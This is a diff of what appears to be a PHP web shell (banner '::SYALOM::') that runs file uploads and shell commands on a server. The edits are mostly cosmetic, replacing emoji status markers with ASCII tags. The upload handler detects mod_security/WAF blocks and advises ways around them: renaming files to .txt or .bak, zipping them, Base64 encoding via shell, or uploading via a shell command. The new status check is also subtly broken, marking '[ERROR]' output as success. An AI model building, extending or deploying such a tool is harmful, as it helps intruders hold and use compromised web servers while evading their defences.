@@ -3534,29 +3534,31 @@ if (isset($_FILES['upload_file'])) {
     // 🎯 DETEKSI MOD_SECURITY / FIREWALL BLOCK
     // Jika $_FILES ada tapi kosong, kemungkinan diblok firewall
     if (empty($_FILES['upload_file']['name'][0]) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-        // Cek apakah ada header mod_security
+        // Cek apakah ada header mod_security (jika getallheaders tersedia)
         $modsecHit = false;
-        foreach (getallheaders() as $header => $value) {
-            if (stripos($header, 'mod_security') !== false || 
-                stripos($header, 'x-mod-sec') !== false ||
-                stripos($value, '403') !== false) {
-                $modsecHit = true;
-                break;
+        if (function_exists('getallheaders')) {
+            foreach (getallheaders() as $header => $value) {
+                if (stripos($header, 'mod_security') !== false || 
+                    stripos($header, 'x-mod-sec') !== false ||
+                    stripos($value, '403') !== false) {
+                    $modsecHit = true;
+                    break;
+                }
             }
         }
         
-        $output = "❌ Upload blocked by server firewall!\n\n";
+        $output = "[ERROR] Upload blocked by server firewall!\n\n";
         if ($modsecHit) {
-            $output .= "🛡️ mod_security blocked the upload.\n";
+            $output .= "Server firewall (mod_security) blocked the upload.\n";
         } else {
-            $output .= "🛡️ Server firewall (LiteSpeed/Apache/Nginx) blocked the upload.\n";
+            $output .= "Server firewall (LiteSpeed/Apache/Nginx) blocked the upload.\n";
         }
         $output .= "\nPossible reasons:\n";
-        $output .= "• File content flagged as suspicious\n";
-        $output .= "• File extension blacklisted\n";
-        $output .= "• File size exceeds server limit\n";
-        $output .= "• WAF rule triggered\n\n";
-        $output .= "💡 Workarounds:\n";
+        $output .= "- File content flagged as suspicious\n";
+        $output .= "- File extension blacklisted\n";
+        $output .= "- File size exceeds server limit\n";
+        $output .= "- WAF rule triggered\n\n";
+        $output .= "Workarounds:\n";
         $output .= "1. Rename file to .txt or .bak first\n";
         $output .= "2. Compress as .zip file\n";
         $output .= "3. Use Base64 encoding via shell\n";
@@ -3577,13 +3579,13 @@ if (isset($_FILES['upload_file'])) {
     
     // Check if directory is writable
     if (!is_writable($dir)) {
-        $output = "❌ Upload failed: Directory not writable. Check permissions.";
-        $output .= "\n💡 Try uploading to /tmp/ instead.";
+        $output = "[ERROR] Upload failed: Directory not writable. Check permissions.";
+        $output .= "\n[TIP] Try uploading to /tmp/ instead.";
     } else {
         // Check available disk space (minimum 1MB)
         $freeSpace = @disk_free_space($dir);
         if ($freeSpace !== false && $freeSpace < 1024 * 1024) {
-            $output = "❌ Upload failed: Insufficient disk space (< 1MB free).";
+            $output = "[ERROR] Upload failed: Insufficient disk space (< 1MB free).";
         } else {
             for ($i = 0; $i < $fileCount; $i++) {
                 $fileName = $_FILES['upload_file']['name'][$i];
@@ -3676,28 +3678,28 @@ if (isset($_FILES['upload_file'])) {
             
             // Build detailed output
             if ($uploadedCount > 0 && $failedCount === 0) {
-                $output = "✅ Upload successful: $uploadedCount file(s) uploaded.\n";
+                $output = "[SUCCESS] Upload successful: $uploadedCount file(s) uploaded.\n";
                 foreach ($uploadedFiles as $file) {
                     $overwriteMark = $file['overwrite'] ? ' (overwritten)' : '';
                     $sizeFormatted = format_bytes($file['size']);
-                    $output .= "   📄 {$file['name']} ($sizeFormatted)$overwriteMark\n";
+                    $output .= "   [FILE] {$file['name']} ($sizeFormatted)$overwriteMark\n";
                 }
             } elseif ($uploadedCount > 0 && $failedCount > 0) {
-                $output = "⚠️ Partial success: $uploadedCount uploaded, $failedCount failed.\n\n";
-                $output .= "✅ Uploaded:\n";
+                $output = "[WARNING] Partial success: $uploadedCount uploaded, $failedCount failed.\n\n";
+                $output .= "Uploaded:\n";
                 foreach ($uploadedFiles as $file) {
                     $overwriteMark = $file['overwrite'] ? ' (overwritten)' : '';
                     $sizeFormatted = format_bytes($file['size']);
-                    $output .= "   📄 {$file['name']} ($sizeFormatted)$overwriteMark\n";
+                    $output .= "   [FILE] {$file['name']} ($sizeFormatted)$overwriteMark\n";
                 }
-                $output .= "\n❌ Failed:\n";
+                $output .= "\nFailed:\n";
                 foreach ($failedFiles as $file) {
-                    $output .= "   📄 {$file['name']}: {$file['reason']}\n";
+                    $output .= "   [FILE] {$file['name']}: {$file['reason']}\n";
                 }
             } else {
-                $output = "❌ Upload failed for all $failedCount file(s).\n\nDetails:\n";
+                $output = "[ERROR] Upload failed for all $failedCount file(s).\n\nDetails:\n";
                 foreach ($failedFiles as $file) {
-                    $output .= "   📄 {$file['name']}: {$file['reason']}\n";
+                    $output .= "   [FILE] {$file['name']}: {$file['reason']}\n";
                 }
             }
         }
@@ -4026,7 +4028,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2103</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2200</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4128,17 +4130,17 @@ function list_dir($path) {
 <?php if (!empty($output)): 
     // Determine color and status based on output prefix
     $outputPrefix = isset($output[0]) ? $output[0] : '';
-    // Use ASCII characters for checking to avoid multi-byte issues
-    $checkOutput = $output;
-    if (strpos($checkOutput, "\xe2\x9c\x85") === 0) { // ✅
+    // Check first character to determine status
+    $firstChar = isset($output[0]) ? $output[0] : '';
+    if ($firstChar === '[' || strpos($output, 'Success') !== false) {
         $borderColor = '#0f0';
         $titleColor = '#0f0';
         $statusText = 'Success';
-    } elseif (strpos($checkOutput, "\xe2\x9a\xa0\xef\xb8\x8f") === 0) { // ⚠️
+    } elseif (strpos($output, 'Warning') !== false || strpos($output, 'Partial') !== false) {
         $borderColor = '#ff0';
         $titleColor = '#ff0';
         $statusText = 'Warning';
-    } elseif (strpos($checkOutput, "\xe2\x9d\x8c") === 0) { // ❌
+    } elseif ($firstChar === 'E' || strpos($output, 'Failed') !== false || strpos($output, 'blocked') !== false) {
         $borderColor = '#f44';
         $titleColor = '#f44';
         $statusText = 'Error';
@@ -5655,7 +5657,7 @@ function sortTable(columnIndex) {
                 if (selectedFiles.length === 0) {
                     showUploadResult({
                         type: 'info',
-                        title: 'ℹ️ Upload Cancelled',
+                        title: '[INFO] Upload Cancelled',
                         message: 'All selected files already exist and overwrite was cancelled.'
                     });
                     return;
@@ -5704,7 +5706,7 @@ function sortTable(columnIndex) {
         .then(html => {
             clearInterval(progressInterval);
             
-            // 🎯 CEK JIKA RESPONSE MENGANDUNG ERROR PAGE (403, 500, etc)
+            // CEK JIKA RESPONSE MENGANDUNG ERROR PAGE (403, 500, etc)
             const lowerHtml = html.toLowerCase();
             const isForbidden = 
                 lowerHtml.includes('403 forbidden') || 
@@ -5720,12 +5722,12 @@ function sortTable(columnIndex) {
                 html.includes('has been blocked');
             
             if (isForbidden) {
-                submitBtn.innerHTML = '❌ Blocked!';
+                submitBtn.innerHTML = '[BLOCKED]';
                 showUploadResult({
                     type: 'error',
-                    title: '❌ Upload Blocked by Server',
+                    title: '[ERROR] Upload Blocked by Server',
                     message: 'Server firewall (mod_security/LiteSpeed) blocked the upload.',
-                    details: `The file was rejected by server security rules.\n\nPossible causes:\n• File content detected as malicious\n• File extension blacklisted\n• File size too large for server\n• mod_security rule triggered\n\nTry:\n1. Rename file to .txt or .bak\n2. Compress as .zip\n3. Upload via Shell command instead`
+                    details: 'The file was rejected by server security rules.\n\nPossible causes:\n• File content detected as malicious\n• File extension blacklisted\n• File size too large for server\n• mod_security rule triggered\n\nTry:\n1. Rename file to .txt or .bak\n2. Compress as .zip\n3. Upload via Shell command instead'
                 });
                 return;
             }
@@ -5739,38 +5741,42 @@ function sortTable(columnIndex) {
             
             if (outputEl) {
                 const outputText = outputEl.textContent.trim();
-                submitBtn.innerHTML = outputText.startsWith('✅') ? '✅ Completed!' : 
-                                      outputText.startsWith('⚠️') ? '⚠️ Partial' : '❌ Failed!';
+                const isSuccess = outputText.indexOf('[SUCCESS]') === 0;
+                const isWarning = outputText.indexOf('[WARNING]') === 0;
+                const isError = outputText.indexOf('[ERROR]') === 0;
+                
+                submitBtn.innerHTML = isSuccess ? '[SUCCESS] Completed!' : 
+                                      isWarning ? '[WARNING] Partial' : '[ERROR] Failed!';
                 
                 // Determine result type
                 let resultType = 'info';
-                if (outputText.startsWith('✅')) {
+                if (isSuccess) {
                     resultType = 'success';
-                    shouldRefresh = true; // Only refresh on success
-                } else if (outputText.startsWith('⚠️')) {
+                    shouldRefresh = true;
+                } else if (isWarning) {
                     resultType = 'warning';
-                    shouldRefresh = true; // Partial success, still refresh
-                } else if (outputText.startsWith('❌')) {
+                    shouldRefresh = true;
+                } else if (isError) {
                     resultType = 'error';
-                    shouldRefresh = false; // Don't refresh on error
+                    shouldRefresh = false;
                 }
                 
                 // Show detailed result modal
                 showUploadResult({
                     type: resultType,
-                    title: resultType === 'success' ? '✅ Upload Successful' : 
-                           resultType === 'warning' ? '⚠️ Partial Success' : 
-                           resultType === 'error' ? '❌ Upload Failed' : 'ℹ️ Upload Result',
+                    title: resultType === 'success' ? '[SUCCESS] Upload Successful' : 
+                           resultType === 'warning' ? '[WARNING] Partial Success' : 
+                           resultType === 'error' ? '[ERROR] Upload Failed' : '[INFO] Upload Result',
                     message: outputText.split('\n')[0],
                     details: outputText.split('\n').slice(1).join('\n')
                 });
             } else {
-                // 🎯 JIKA TIDAK ADA OUTPUT ELEMENT, JANGAN ASUMSI SUKSES
-                submitBtn.innerHTML = '⚠️ Unknown Status';
+                // JIKA TIDAK ADA OUTPUT ELEMENT, JANGAN ASUMSI SUKSES
+                submitBtn.innerHTML = '[UNKNOWN] Status';
                 shouldRefresh = false;
                 showUploadResult({
                     type: 'warning',
-                    title: '⚠️ Upload Status Unknown',
+                    title: '[WARNING] Upload Status Unknown',
                     message: 'Cannot verify upload result from server response.',
                     details: 'The server responded but no status information was found.\n\nPlease check the Files tab to verify if the upload succeeded.\n\nCommon causes:\n• Server error page returned\n• Response truncated\n• Network timeout'
                 });
